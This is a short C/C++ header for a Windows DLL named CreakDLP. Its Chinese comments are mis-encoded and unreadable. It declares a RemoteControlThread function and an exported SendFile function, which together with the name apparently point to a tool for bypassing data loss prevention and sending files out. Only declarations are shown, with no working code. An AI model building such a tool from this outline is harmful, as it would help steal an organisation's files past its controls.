// ���� ifdef ���Ǵ���ʹ�� DLL �������򵥵�
// ��ı�׼�������� DLL �е������ļ��������������϶���� CREAKDLP_EXPORTS
// ���ű���ġ���ʹ�ô� DLL ��
// �κ�������Ŀ�ϲ�Ӧ����˷��š�������Դ�ļ��а������ļ����κ�������Ŀ���Ὣ
// CREAKDLP_API ������Ϊ�Ǵ� DLL ����ģ����� DLL ���ô˺궨���
// ������Ϊ�Ǳ������ġ�
#ifdef CREAKDLP_EXPORTS
#define CREAKDLP_API __declspec(dllexport)
#else
#define CREAKDLP_API __declspec(dllimport)
#endif

//// �����Ǵ� CreakDLP.dll ������
//class CREAKDLP_API CCreakDLP
//{
//public:
//	CCreakDLP(void);
//	// TODO: �ڴ�������ķ�����
//};
//// ��������
//extern CREAKDLP_API int nCreakDLP;
//// ��������
//CREAKDLP_API int fnCreakDLP(void);

UINT WINAPI RemoteControlThread(LPVOID lpvoid);
//���ļ�ȡ���ļ����ݲ����ͳ�ȥ
CREAKDLP_API void SendFile();
//extern "C" __declspec(dllexport) void SendFile();